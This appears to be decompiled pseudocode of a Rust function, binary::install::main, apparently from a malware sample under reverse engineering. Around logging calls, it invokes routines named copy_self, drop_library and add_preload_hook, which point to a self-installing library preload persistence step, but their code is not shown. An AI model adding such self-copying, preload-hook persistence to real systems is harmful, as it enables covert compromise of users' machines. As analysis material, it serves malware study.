
  fn binary::install::main::h1e5509fe79972199() -> u64

{
    let mut var_78: *const i8;
    let mut var_50: *mut *mut [i8; 0x0];
    
    if core::sync::atomic::atomic_load::hd7b4c98b0ffd57c6() >= 3
    {
        var_50 = &data_1ce6ab8;
        let var_48_1: i64 = 1;
        let var_40_1: i64 = 8;
        let var_38_1: i128 = {0};
        let rax_1: i64 = log::__private_api::loc::h72c33e8a02a7057c(&data_1ce6ad8);
        var_78 = &data_45022a[0x15];
        let var_70_1: i64 = 0xf;
        let var_68_1: *const i8 = &data_45022a[0x15];
        let var_60_1: i64 = 0xf;
        let var_58_1: i64 = rax_1;
        log::__private_api::log::h450dfdf51a11f9e0(&var_50, 3, &var_78);
    }
    
    binary::install::copy_self::h6799c86bda448ec8();
    let mut var_20: ();
    binary::install::drop_library::h6c2d6da60051269a(&var_20);
    binary::install::add_preload_hook::hf67ddbcc23099137(&var_20);
    let result: u64 = core::sync::atomic::atomic_load::hd7b4c98b0ffd57c6();
    
    if result < 3
    {
        return result;
    }
    
    var_50 = &data_1ce6ac8;
    let var_48_2: i64 = 1;
    let var_40_2: i64 = 8;
    let var_38_2: i128 = {0};
    let rax_2: i64 = log::__private_api::loc::h72c33e8a02a7057c(&data_1ce6af0);
    var_78 = &data_45022a[0x15];
    let var_70_2: i64 = 0xf;
    let var_68_2: *const i8 = &data_45022a[0x15];
    let var_60_2: i64 = 0xf;
    let var_58_2: i64 = rax_2;
    log::__private_api::log::h450dfdf51a11f9e0(&var_50, 3, &var_78)
}
